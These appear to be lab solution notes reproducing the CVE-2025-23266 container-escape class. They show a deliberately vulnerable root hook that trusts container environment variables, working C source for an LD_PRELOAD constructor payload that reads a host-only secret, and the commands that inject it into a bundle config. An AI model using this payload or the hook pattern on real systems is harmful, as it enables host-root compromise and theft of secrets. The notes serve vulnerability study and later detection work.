# Phase 2 — Solution notes (NVIDIAScape-class escape)

Reproducing the CVE-2025-23266 *class* from first principles, no GPU. This is
Phase 1's Challenge C turned into working code. Blog material.

## Threat model (the framing that makes it real)

I played the **tenant/attacker** who controls **only the container image** — its
filesystem and its environment variables. I did **not** control the runtime, the
hook, or the host. The "cloud vendor" side was fixed infrastructure:

- host-only secret `/opt/gpu-sec/host-only/flag.txt` (`root:600`) — invisible to
  the container (wrong mount namespace *and* wrong perms);
- a vulnerable vendor hook `vuln-hook.sh` (stand-in for `nvidia-cdi-hook`), wired
  as an OCI `createRuntime` hook → runs **on the host, as root**, before my
  container starts.

Escape = my code runs as host-root and reads that secret, using only a crafted
image.

## The vulnerability (root cause)

`vuln-hook.sh`, running as host root, "helpfully" applies the container's
requested environment to itself:

```bash
while IFS= read -r kv; do
  [ -n "$kv" ] && export "$kv"          # <-- the trust: attacker env -> host-root process
done < <(jq -r '.process.env[]?' "$bundle/config.json")   # <-- the source: attacker-controlled
exec /bin/true                          # <-- the trigger: ld.so honours LD_PRELOAD here
```

- **Trust** = `export "$kv"` — it pulls the container's `process.env` (which the
  attacker owns) straight into a host-root process, unvalidated.
- **Source** = `jq -r '.process.env[]?'` — attacker-controlled data.
- **Trigger** = `exec /bin/true` — any dynamically-linked exec makes the host's
  `ld.so` act on the now-poisoned `LD_PRELOAD`.

Counterfactuals that prove which line is the bug: delete the `export` loop and the
exec is harmless; keep the loop but replace the exec with `exit 0` and nothing
fires (though *any* later dynamic exec would). **The trust is the vuln; the exec is
just where it goes off.** Same split as the real nvidia hook.

## The exploit — two parts a tenant controls

**1. The payload `evil.so`** — the Phase 1 constructor trick, now doing something
that proves host compromise:

```c
#include <stdio.h>
#include <unistd.h>

__attribute__((constructor))          // runs on load, before main(), in the hook's exec'd proc
void init(void) {
    char buf[256] = "";
    FILE *f = fopen("/opt/gpu-sec/host-only/flag.txt", "r");   // READ the secret (we're root)
    if (f) { fgets(buf, sizeof(buf), f); fclose(f); }
    FILE *proof = fopen("/opt/gpu-sec/escape-proof.txt", "w"); // WRITE proof of who we ran as
    if (proof) { fprintf(proof, "uid=%d flag=%s", geteuid(), buf); fclose(proof); }
}
```

**2. The delivery** — set `LD_PRELOAD` in the container's env (attacker-controlled):

```bash
gcc -shared -fPIC -o /opt/gpu-sec/attack-bundle/rootfs/evil.so evil.c
cd /opt/gpu-sec/attack-bundle
jq '.process.env += ["LD_PRELOAD=/opt/gpu-sec/attack-bundle/rootfs/evil.so"]' \
   config.json > config.tmp && mv config.tmp config.json
```

That's the entire attack — a payload in the image and one env var. The vendor hook
does the rest, unwittingly.

## Proof

```
$ bash check_escape.sh
proof: uid=0 flag=FLAG-48c89a9cb00c7968
[ok] payload executed as ROOT on the host (uid=0)
[ok] payload exfiltrated the host-only secret the container cannot see — ESCAPE CONFIRMED
```

`uid=0` on the host + the host-only flag in my proof file = full container escape,
achieved by shipping an image. No kernel bug, no GPU.

## Gotchas hit (C, mostly — the vehicle, not the point)

Not being a C person, my first `evil.c` had four bugs, all instructive:
1. opened the secret with `"w"` (write/**truncate**) instead of `"r"` (read) — I'd
   have destroyed the thing I was trying to steal;
2. referenced `buf` without ever declaring/filling it (never actually *read* the
   flag);
3. wrote to `proof` but had named the handle `f2` — undeclared variable;
4. missing semicolon.
Lesson: guard `fopen` with `if (f)` so a wrong path fails soft and still leaves a
proof file to debug with.

## The one-line takeaway

*A host-privileged process trusted attacker-controlled input (an inherited
`LD_PRELOAD` pointing at an attacker-supplied library), so the attacker's code ran
as root on the host.* That sentence is CVE-2025-23266 — and the crown-jewel
GPU-cloud bug of the last year is Linux + the dynamic linker, not GPU firmware.

## Keep this exploit

`check_escape.sh` + the weaponised bundle are your **red-team fixture** for Phase 3
(telemetry) and Phase 4 (detections). Don't tear it down — you detect it next.
